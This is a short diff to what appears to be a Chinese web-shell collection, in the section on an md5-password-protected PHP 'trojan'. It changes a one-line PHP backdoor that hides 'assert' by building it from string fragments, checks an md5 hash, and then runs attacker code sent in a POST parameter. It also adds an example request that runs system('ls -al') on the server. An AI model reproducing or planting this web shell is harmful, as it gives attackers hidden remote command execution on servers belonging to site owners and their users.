@@ -316,7 +316,9 @@ a17ef5f51631bba2b7098bdeee4d729566668888
 md5马:
 ```
 //v5est0r
-<?php $a="a"."s"."se"."rt";if (md5($_COOKIE[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_COOKIE[1]);}?>
+<?php $a="a"."s"."se"."rt";if (md5($_POST[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_POST[123]);}?>
+
+POST: 2=v5est0r&123=system("ls -al")
 ```
 header传参的马:
 ```
